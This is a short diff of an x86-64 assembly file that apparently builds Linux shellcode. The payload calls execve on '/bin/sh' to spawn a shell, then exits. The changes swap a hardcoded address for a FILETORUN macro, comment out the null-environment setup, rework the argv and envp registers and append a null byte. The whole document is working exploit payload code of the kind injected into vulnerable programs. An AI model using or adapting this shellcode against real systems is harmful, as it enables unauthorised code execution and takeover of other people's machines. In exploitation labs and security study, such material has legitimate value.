@@ -9,6 +9,8 @@
 #define ARGV    (STRLEN+1)
 #define ENVP    (ARGV+8)
 
+#define FILETORUN 0x400521
+
 .globl main
         .type   main, @function
 
@@ -17,22 +19,23 @@ main:
 
 payload:
 
-        movq    $0x400521, %rcx
+        movq    $FILETORUN, %rcx
         movq    %rcx, (ARGV)(%rcx)       /* set up argv pointer to pathname */
 
         xorq    %rax, %rax               /* get a 64-bit zero value */
-        movq    %rax, (ENVP)(%rcx)       /* set up null envp */
+        //movq    %rax, (ENVP)(%rcx)       /* set up null envp */
 
         movq    $SYS_execve, %rax        /* syscall arg 1: syscall number */
         movq    %rcx, %rdi               /* syscall arg 2: string pathname */
-        leaq    ARGV(%rcx), %rsi         /* syscall arg 2: argv */
-        leaq    ENVP(%rcx), %rdx         /* syscall arg 3: envp */
+        movq    %rcx, %rsi               /* syscall arg 2: argv */
+        leaq    8(%rcx), %rdx         /* syscall arg 3: envp */
         syscall                          /* invoke syscall */
 
         movq    $SYS_exit, %rax          /* syscall arg 1: SYS_exit (60) */
         xorq    %rdi,%rdi                /* syscall arg 2: 0 */
         syscall                          /* invoke syscall */
         .ascii  "/bin/sh\0"
+        .ascii  "\0"
 
 callptr:
     call    payload                      /* push STRING ptr to stack */
